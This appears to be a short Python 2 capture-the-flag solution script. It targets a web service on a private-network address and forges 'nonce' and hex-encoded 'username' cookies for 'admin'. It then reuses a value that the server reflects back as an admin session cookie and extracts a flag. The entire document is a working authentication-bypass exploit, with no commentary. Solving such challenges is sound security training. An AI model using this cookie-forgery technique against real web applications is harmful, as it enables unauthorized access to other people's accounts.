import requests
import re


REMOTE = "http://10.0.10.10:5005"
USERNAME = "admin"
NONCE = "100"

r = requests.get(REMOTE + "/loggedin", cookies={"nonce": NONCE,
                                                "username": USERNAME.encode("hex")})

admin_cookie = re.search(r"Thank you for signing in, ([0-9a-fA-F]+)",
                         r.content).group(1).decode("hex")

resp = requests.get(REMOTE + "/loggedin", cookies={"nonce": NONCE,
                                                   "username": admin_cookie.encode("hex")})
print re.search(r"595g\{[a-zA-Z0-9]+\}", resp.content).group(0)
